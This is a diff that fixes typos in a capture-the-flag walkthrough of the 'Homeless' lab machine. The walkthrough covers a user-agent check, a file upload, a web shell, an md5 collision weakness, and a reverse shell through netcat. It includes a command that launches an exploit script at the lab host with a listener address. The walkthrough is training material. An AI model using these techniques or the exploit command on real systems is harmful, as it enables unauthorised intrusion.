@@ -4,33 +4,33 @@ Within this walkthrough, I will skip any part not related to the web application
 
 #### Intro
 
-Homeless is a funny CTF, and as web application balck-box test it has some interesting points; however the application, in PHP, is far from being complex. 
+Homeless is a funny CTF, and as web application black-box test it has some interesting points; however, the application, in PHP, is far from being complex. 
 
-I will almost skip the discovery part, as in a whitebox assessment has almost no meaning.
+I will almost skip the discovery part, as in a Whitebox assessment has almost no meaning.
 
 #### Directory structure
 
-Stripping all unuseful resource files, the application's structure lookes like the following:
+Stripping all useless resource files, the application's structure looks like the following:
 
 ```
 /var/www/html
 ├── index.php
 ├── robots.txt
 ├── myuploader_priv
-│   ├── files
-│   │   ├── 887beed152a3e8f946857bade267bb19d159ef59.txt
-│   │   ├── index.php
-│   │   └── shell.php
-│   └── index.php
+│   ├── files
+│   │   ├── 887beed152a3e8f946857bade267bb19d159ef59.txt
+│   │   ├── index.php
+│   │   └── shell.php
+│   └── index.php
 └── d5fa314e8577e3a7b8534a014b4dcb221de823ad
-    ├── admin.php
-    ├── index.php
-    └── index.php.bak
+    ├── admin.php
+    ├── index.php
+    └── index.php.bak
 ```
 
 #### Vulnerability Discovery
 
-We'll start looking at the index.php file, which containes an info to proceed to the next file to analyse: 
+We'll start looking at the index.php file, which contains an info to proceed to the next file to analyse: 
 
 ```php
 <?php
@@ -44,7 +44,7 @@ if(preg_match('/Cyberdog/i',$u_agent)){
 ?>
 ```
 
-So to we are now aware that there is a restriction in place allowing only `HTTP USER AGENT`s containing the word 'Cyberdog'. The flow control is then passed to `/myuploader_priv/index.php`. In this file, we can detect a file upload functionality, as observable below:
+So, we are now aware that there is a restriction in place allowing only `HTTP USER AGENT`s containing the word 'Cyberdog'. The flow control is then passed to `/myuploader_priv/index.php`. In this file, we can detect a file upload functionality, as observable below:
 
 ```php
 <?php
@@ -136,7 +136,7 @@ if($_SERVER['REQUEST_METHOD'] === "POST" && isset($_POST['submit'])){
 ?>
 ```
 
-Yes, it is a web shell. To simplify the exploitation process, netcat (traditional with -e option) is already installed on Homeless; so getting a reverse shell is simple as you can imagine.
+Yes, it is a web shell. To simplify the exploitation process, netcat (traditional with -e option) is already installed on Homeless; so, getting a reverse shell is simple as you can imagine.
 
 ##### Wrapping Up
 
@@ -256,6 +256,6 @@ Launch like:
 python exploit.py -t homeless.local -H 192.168.56.1 -P 444 -x
 ```
 
-#### Conclusions
+#### Conclusion
 
-Homeless is a very nice machine when owned as "black-box", however, the small number of critical files to analyse, and the lack of complexity within the code, made it not enough of a challenge comparing it to the OSWE. The only really interesting piece of this box is the md5 collision vulnerability. If you're interested, I would advice getting more information on [Marc Stevens](https://marc-stevens.nl/research/) page and his [Hashclash](https://github.com/cr-marcstevens/hashclash) project.
+Homeless is a very nice machine when owned as "black-box", however, the small number of critical files to analyse, and the lack of complexity within the code, made it not enough of a challenge comparing it to the OSWE. The only really interesting piece of this box is the md5 collision vulnerability. If you're interested, I would advise getting more information on [Marc Stevens](https://marc-stevens.nl/research/) page and his [Hashclash](https://github.com/cr-marcstevens/hashclash) project.
